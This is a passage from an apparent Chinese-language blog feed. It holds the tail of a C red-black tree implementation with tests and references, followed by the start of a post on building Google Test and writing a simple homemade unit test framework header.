class="line">        <span class="keyword">if</span>(x != T-&gt;nil)   </span><br><span class="line">            <span class="keyword">if</span>(x-&gt;left-&gt;color == RED &amp;&amp; x-&gt;right-&gt;color == RED)</span><br><span class="line">                rbt_handleReorient(T,x,k);</span><br><span class="line"></span><br><span class="line">        p = x;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;x-&gt;key)</span><br><span class="line">            x = x-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k&gt;x-&gt;key)</span><br><span class="line">            x = x-&gt;right;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n%d已存在\n&quot;</span>,k);</span><br><span class="line">            <span class="keyword">return</span> T;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为x分配空间，并对其进行初始化</span></span><br><span class="line">    x = (<span class="keyword">rbt_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">rbt_t</span>));</span><br><span class="line">    assert(<span class="literal">NULL</span> != x);</span><br><span class="line">    x-&gt;key = k;</span><br><span class="line">    x-&gt;color = RED;</span><br><span class="line">    x-&gt;left = x-&gt;right = T-&gt;nil;</span><br><span class="line">    x-&gt;p = p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//让x的父亲指向x</span></span><br><span class="line">    <span class="keyword">if</span>(T-&gt;root == T-&gt;nil)</span><br><span class="line">        T-&gt;root = x;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(k &lt; p-&gt;key)</span><br><span class="line">        p-&gt;left = x;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        p-&gt;right = x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//因为一路下来，如果x的父亲是红色，那么x的叔叔肯定不是红色了，这个时候只需要做一下翻转即可。</span></span><br><span class="line">    rbt_handleReorient(T,x,k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_transplant</span><span class="params">(<span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* u, <span class="keyword">rbt_t</span>* v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u-&gt;p == T-&gt;nil)</span><br><span class="line">        T-&gt;root = v;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(u == u-&gt;p-&gt;left)</span><br><span class="line">        u-&gt;p-&gt;left =v;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        u-&gt;p-&gt;right = v;</span><br><span class="line">    v-&gt;p = u-&gt;p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*@brief rbt_delete 从树中删除 k</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">rbt_root_t</span>* <span class="title">rbt_delete</span><span class="params">(<span class="keyword">rbt_root_t</span>* &amp;T, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    assert(T != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == T-&gt;root) <span class="keyword">return</span> T;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//找到要被删除的叶子结点</span></span><br><span class="line">    <span class="keyword">rbt_t</span> * toDelete = T-&gt;root; </span><br><span class="line">    <span class="keyword">rbt_t</span> * x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//找到值为k的结点</span></span><br><span class="line">    <span class="keyword">while</span>(toDelete != T-&gt;nil &amp;&amp; toDelete-&gt;key != k)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;toDelete-&gt;key)</span><br><span class="line">            toDelete = toDelete-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k&gt;toDelete-&gt;key)</span><br><span class="line">            toDelete = toDelete-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(toDelete == T-&gt;nil)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d 不存在\n&quot;</span>,k);</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果两个孩子，就找到右子树中最小的代替, alternative最多有一个右孩子</span></span><br><span class="line">    <span class="keyword">if</span>(toDelete-&gt;left != T-&gt;nil &amp;&amp; toDelete-&gt;right != T-&gt;nil)&#123;</span><br><span class="line">        <span class="keyword">rbt_t</span>* alternative = rbt_findMin(T, toDelete-&gt;right);</span><br><span class="line">        k = toDelete-&gt;key = alternative-&gt;key;</span><br><span class="line">        toDelete = alternative;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(toDelete-&gt;left == T-&gt;nil)&#123;</span><br><span class="line">        x = toDelete-&gt;right;</span><br><span class="line">        rbt_transplant(T,toDelete,toDelete-&gt;right);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(toDelete-&gt;right == T-&gt;nil)&#123;</span><br><span class="line">        x = toDelete-&gt;left;</span><br><span class="line">        rbt_transplant(T,toDelete,toDelete-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(toDelete-&gt;color == BLACK)&#123;</span><br><span class="line">        <span class="comment">//x不是todelete，而是用于代替x的那个</span></span><br><span class="line">        <span class="comment">//如果x颜色为红色的，把x涂成黑色即可， 否则 从根到x处少了一个黑色结点，导致不平衡</span></span><br><span class="line">        <span class="keyword">while</span>(x != T-&gt;root &amp;&amp; x-&gt;color == BLACK)&#123;</span><br><span class="line">            <span class="keyword">if</span>(x == x-&gt;p-&gt;left)&#123;</span><br><span class="line">                <span class="keyword">rbt_t</span>* w = x-&gt;p-&gt;right;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//情况1 x的兄弟是红色的，通过</span></span><br><span class="line">                <span class="keyword">if</span>(RED == w-&gt;color)&#123;</span><br><span class="line">                    w-&gt;color = BLACK;</span><br><span class="line">                    w-&gt;p-&gt;color = RED;</span><br><span class="line">                    rbt_left_rotate(T,x-&gt;p);</span><br><span class="line">                    w = x-&gt;p-&gt;right;</span><br><span class="line">                &#125;<span class="comment">//处理完情况1之后，w.color== BLACK ， 情况就变成2 3 4 了</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//情况2 x的兄弟是黑色的，并且其儿子都是黑色的。</span></span><br><span class="line">                <span class="keyword">if</span>(w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(x-&gt;p-&gt;color == RED)&#123;</span><br><span class="line">                        x-&gt;p-&gt;color = BLACK;</span><br><span class="line">                        w-&gt;color = RED;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        w-&gt;color = RED;</span><br><span class="line">                        x = x-&gt;p;<span class="comment">//x.p左右是平衡的，但是x.p处少了一个黑结点，所以把x.p作为新的x继续循环</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//情况3 w为黑色的，左孩子为红色。（走到这一步，说明w左右不同时为黑色。）</span></span><br><span class="line">                <span class="keyword">if</span>(w-&gt;right-&gt;color == BLACK)&#123;</span><br><span class="line">                    w-&gt;left-&gt;color = BLACK;</span><br><span class="line">                    w-&gt;color = RED;</span><br><span class="line">                    rbt_right_rotate(T,w);</span><br><span class="line">                    w = x-&gt;p-&gt;right;</span><br><span class="line">                &#125;<span class="comment">//处理完之后，变成情况4</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//情况4 走到这一步说明w为黑色， w的左孩子为黑色， 右孩子为红色。</span></span><br><span class="line"></span><br><span class="line">                w-&gt;color=x-&gt;p-&gt;color;</span><br><span class="line">                x-&gt;p-&gt;color=BLACK;</span><br><span class="line">                w-&gt;right-&gt;color=BLACK;</span><br><span class="line">                rbt_left_rotate(T,x-&gt;p);</span><br><span class="line">                x = T-&gt;root;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">rbt_t</span>* w = x-&gt;p-&gt;left;</span><br><span class="line">                <span class="comment">//1</span></span><br><span class="line">                <span class="keyword">if</span>(w-&gt;color == RED)&#123;</span><br><span class="line">                    w-&gt;color = BLACK;</span><br><span class="line">                    x-&gt;p-&gt;color = RED;</span><br><span class="line">                    rbt_right_rotate(T,x-&gt;p);</span><br><span class="line">                    w = x-&gt;p-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//2</span></span><br><span class="line">                <span class="keyword">if</span>(w-&gt;left-&gt;color==BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(x-&gt;p-&gt;color == RED)&#123;</span><br><span class="line">                        x-&gt;p-&gt;color = BLACK;</span><br><span class="line">                        w-&gt;color = RED;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        x-&gt;p-&gt;color = BLACK;</span><br><span class="line">                        w-&gt;color = RED;</span><br><span class="line">                        x = x-&gt;p;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//3</span></span><br><span class="line">                <span class="keyword">if</span>(w-&gt;left-&gt;color == BLACK)&#123;</span><br><span class="line">                    w-&gt;color = RED;</span><br><span class="line">                    w-&gt;right-&gt;color = BLACK;</span><br><span class="line">                    w = x-&gt;p-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//4</span></span><br><span class="line">                w-&gt;color=w-&gt;p-&gt;color;</span><br><span class="line">                x-&gt;p-&gt;color = BLACK;</span><br><span class="line">                w-&gt;left-&gt;color = BLACK;</span><br><span class="line">                rbt_right_rotate(T,x-&gt;p);</span><br><span class="line">                x = T-&gt;root;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        x-&gt;color = BLACK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//放心删除todelete 吧</span></span><br><span class="line">    <span class="built_in">free</span>(toDelete);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*@brief rbt_left_rotate</span></span><br><span class="line"><span class="comment">*@param[in] T 树根</span></span><br><span class="line"><span class="comment">*@param[in] x 要进行旋转的结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_left_rotate</span><span class="params">( <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">rbt_t</span>* y = x-&gt;right;</span><br><span class="line"></span><br><span class="line">    x-&gt;right = y-&gt;left;</span><br><span class="line">    <span class="keyword">if</span>(x-&gt;right != T-&gt;nil)</span><br><span class="line">        x-&gt;right-&gt;p = x;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    y-&gt;p = x-&gt;p;</span><br><span class="line">    <span class="keyword">if</span>(y-&gt;p == T-&gt;nil)&#123;</span><br><span class="line">        T-&gt;root = y;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(y-&gt;key &lt; y-&gt;p-&gt;key)</span><br><span class="line">        y-&gt;p-&gt;left = y;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        y-&gt;p-&gt;right = y;</span><br><span class="line"></span><br><span class="line">    y-&gt;left = x;</span><br><span class="line">    x-&gt;p = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*@brief rbt_right_rotate</span></span><br><span class="line"><span class="comment">*@param[in] 树根</span></span><br><span class="line"><span class="comment">*@param[in] 要进行旋转的结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_right_rotate</span><span class="params">( <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">rbt_t</span> * y = x-&gt;left;</span><br><span class="line">    x-&gt;left = y-&gt;right;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(T-&gt;nil != x-&gt;left)</span><br><span class="line">        x-&gt;left-&gt;p = x;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    y-&gt;p = x-&gt;p;</span><br><span class="line">    <span class="keyword">if</span>(y-&gt;p == T-&gt;nil)</span><br><span class="line">        T-&gt;root = y;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(y-&gt;key &lt; y-&gt;p-&gt;key)</span><br><span class="line">        y-&gt;p-&gt;left= y;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        y-&gt;p-&gt;right = y;</span><br><span class="line"></span><br><span class="line">    y-&gt;right = x;</span><br><span class="line">    x-&gt;p = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_prePrint</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;nil == t)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(t-&gt;color == RED)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3dR&quot;</span>,t-&gt;key);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3dB&quot;</span>,t-&gt;key);</span><br><span class="line">    rbt_prePrint(T,t-&gt;left);</span><br><span class="line">    rbt_prePrint(T,t-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_inPrint</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rbt_root_t</span>* T, <span class="keyword">rbt_t</span>* t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;nil == t)<span class="keyword">return</span> ;</span><br><span class="line">    rbt_inPrint(T,t-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(t-&gt;color == RED)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3dR&quot;</span>,t-&gt;key);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3dB&quot;</span>,t-&gt;key);</span><br><span class="line">    rbt_inPrint(T,t-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印程序包括前序遍历和中序遍历两个，因为它俩可以唯一确定一棵二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rbt_root_t</span>* T)</span></span>&#123;</span><br><span class="line">    assert(T!=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n前序遍历 ：&quot;</span>);</span><br><span class="line">    rbt_prePrint(T,T-&gt;root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n中序遍历 ：&quot;</span>);</span><br><span class="line">    rbt_inPrint(T,T-&gt;root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rbt_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">rbt_root_t</span>* T = rbt_init();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/************************************************************************/</span></span><br><span class="line">    <span class="comment">/* 1    测试插入</span></span><br><span class="line"><span class="comment">    /*</span></span><br><span class="line"><span class="comment">    /*</span></span><br><span class="line"><span class="comment">    /*输出  前序遍历 ：  7B  2R  1B  5B  4R 11R  8B 14B 15R</span></span><br><span class="line"><span class="comment">    /*      中序遍历 ：  1B  2R  4R  5B  7B  8B 11R 14B 15R</span></span><br><span class="line"><span class="comment">    /************************************************************************/</span></span><br><span class="line"></span><br><span class="line">    T = rbt_insert(T,<span class="number">11</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">7</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">1</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">2</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">8</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">14</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">15</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">5</span>);</span><br><span class="line">    T = rbt_insert(T,<span class="number">4</span>); </span><br><span class="line"></span><br><span class="line">    T = rbt_insert(T,<span class="number">4</span>); <span class="comment">//重复插入测试</span></span><br><span class="line">    rbt_print(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/************************************************************************/</span></span><br><span class="line">    <span class="comment">/* 2    测试删除</span></span><br><span class="line"><span class="comment">    /*  </span></span><br><span class="line"><span class="comment">    /*操作  连续删除4个元素 rbt_delete(T,8);rbt_delete(T,14);rbt_delete(T,7);rbt_delete(T,11);</span></span><br><span class="line"><span class="comment">    /*输出  前序遍历 ：  2B  1B  5R  4B 15B</span></span><br><span class="line"><span class="comment">    /*      中序遍历 ：  1B  2B  4B  5R 15B</span></span><br><span class="line"><span class="comment">    /************************************************************************/</span></span><br><span class="line"></span><br><span class="line">    rbt_delete(T,<span class="number">8</span>);</span><br><span class="line">    rbt_delete(T,<span class="number">14</span>);rbt_delete(T,<span class="number">7</span>);rbt_delete(T,<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">    rbt_delete(T,<span class="number">8</span>);<span class="comment">//删除不存在的元素</span></span><br><span class="line">    rbt_print(T);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考    </p><p><a href="https://blog.csdn.net/weixin_42295110/article/details/119539842">https://blog.csdn.net/weixin_42295110/article/details/119539842</a></p><p><a href="https://www.jianshu.com/p/94a1ce4128bd">https://www.jianshu.com/p/94a1ce4128bd</a></p><p><a href="http://blog.csdn.net/weewqrer/article/details/51866488">http://blog.csdn.net/weewqrer/article/details/51866488</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="数据结构" scheme="https://blog.pillar.fun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>单元测试框架</title>
    <link href="https://blog.pillar.fun/2020/07/07/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"/>
    <id>https://blog.pillar.fun/2020/07/07/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</id>
    <published>2020-07-07T07:27:26.000Z</published>
    <updated>2022-02-20T04:23:05.325Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>菜bpillar报名了他们学校的实训，听了老师对单元测试框架的讲解，觉得非常牛逼，打算写一篇博客整理整理。</p><a id="more"></a><h1 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h1><p>古话说得好，只要是程序，就有bug，因此，一个测试程序对于程序本身来说是很有必要的。虽然说通过测试不代表就没有bug，但至少说明程序是概率性正确的。咱就跟着实训来的例子来看看测试程序怎么写。</p><h1 id="谷歌测试框架"><a href="#谷歌测试框架" class="headerlink" title="谷歌测试框架"></a>谷歌测试框架</h1><p>谷歌有一个C++的测试框架gtest，我们在这个框架的基础上来看看。这是他的源码仓库：<br><a href="https://github.com/google/googletest">https://github.com/google/googletest</a><br>其中还有一个介绍怎么整一个自己的测试模块的。<br><a href="https://github.com/google/googletest/tree/master/googletest">https://github.com/google/googletest/tree/master/googletest</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>gtest用cmake编译，所以如果你的电脑上没有cmake就去整一个<br>然后按照上面的教程，在clone下来的源码里执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir mybuild</span><br><span class="line">cd mybuild</span><br><span class="line">cmake $&#123;GTEST_DIR&#125;</span><br></pre></td></tr></table></figure><p>这里的GTEST_DIR随便设。然后我们就会发现mybuild文件夹里出现了一些新的文件，其中包含Makefile</p><p>所以我们直接make+make install就可以了,我们可以发现很多的库文件和头文件被安装了。<br>然后就可以开始编写自己的测试模块了，这里我们就抄一下google自己的sample，测试下大于等于小于啥的<br>main.cpp:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mytest.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TEST(test, add) &#123;</span><br><span class="line">    EXPECT_EQ(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_NE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">8</span>);</span><br><span class="line">    EXPECT_GT(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_LT(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">8</span>);</span><br><span class="line">    EXPECT_GE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_LE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TEST(test, add2) &#123;</span><br><span class="line">    EXPECT_EQ(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_NE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">8</span>);</span><br><span class="line">    EXPECT_GT(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">6</span>);</span><br><span class="line">    EXPECT_LT(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">8</span>);</span><br><span class="line">    EXPECT_GE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_LE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> RUN_ALL_TESTS();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们引入了一个mytest.h的头文件，里面定义了我们测试文件所需要用到的宏和函数等等东西。<br>mytest.h:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _MYTEST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _MYTEST_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT(a, comp, b) &#123; \</span></span><br><span class="line">    <span class="keyword">if</span> (!((a) comp (b))) \</span><br><span class="line">        expect_printf(__FILE__, __LINE__,  \</span><br><span class="line">        <span class="string">&quot;((&quot;</span> <span class="meta">#a <span class="meta-string">&quot;) &quot;</span> #comp <span class="meta-string">&quot; (&quot;</span> #b <span class="meta-string">&quot;))&quot;</span>); \</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ(a, b) EXPECT(a, ==, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_NE(a, b) EXPECT(a, !=, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_GT(a, b) EXPECT(a, &gt;, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_GE(a, b) EXPECT(a, &gt;=, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_LT(a, b) EXPECT(a, &lt;, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_LE(a, b) EXPECT(a, &lt;=, b)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COLOR(msg, code) <span class="meta-string">&quot;\033[&quot;</span> #code <span class="meta-string">&quot;m&quot;</span> msg <span class="meta-string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GREEN(msg) COLOR(msg, 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YELLOW(msg) COLOR(msg, 33)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLUE(msg) COLOR(msg, 34)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RED(msg) COLOR(msg, 35)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST(a, b) \</span></span><br><span class="line"><span class="keyword">void</span> a##_#<span class="meta">#b(); \</span></span><br><span class="line">__attribute__((constructor)) \</span><br><span class="line"><span class="keyword">void</span> register_#<span class="meta">#a##_##b() &#123; \</span></span><br><span class="line">    add_test(a##_#<span class="meta">#b, #a <span class="meta-string">&quot;.&quot;</span> #b); \</span></span><br><span class="line">&#125; \</span><br><span class="line"><span class="keyword">void</span> a##_#<span class="meta">#b()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct TestData &#123;</span><br><span class="line">    <span class="keyword">void</span> (*func)();</span><br><span class="line">    <span class="keyword">char</span> *func_name;</span><br><span class="line">&#125; func_arr[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> func_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> add_test(<span class="keyword">void</span> (*func)(), <span class="keyword">const</span> <span class="keyword">char</span> *func_name) &#123;</span><br><span class="line">    func_arr[func_cnt].func = func;</span><br><span class="line">    func_arr[func_cnt].func_name = strdup(func_name);</span><br><span class="line">    func_cnt += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> expect_printf(<span class="keyword">const</span> <span class="keyword">char</span> *file_name, <span class="keyword">int</span> line_no, <span class="keyword">const</span> <span class="keyword">char</span> *msg) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(YELLOW(<span class="string">&quot;\t%s : %d : Failure\n&quot;</span>), file_name, line_no);</span><br><span class="line">    <span class="built_in">printf</span>(YELLOW(<span class="string">&quot;\t\t%s\n&quot;</span>), msg);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> RUN_ALL_TESTS() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(GREEN(<span class="string">&quot;[==========] &quot;</span>) <span class="string">&quot;Running %d tests\n&quot;</span>, func_cnt);</span><br><span 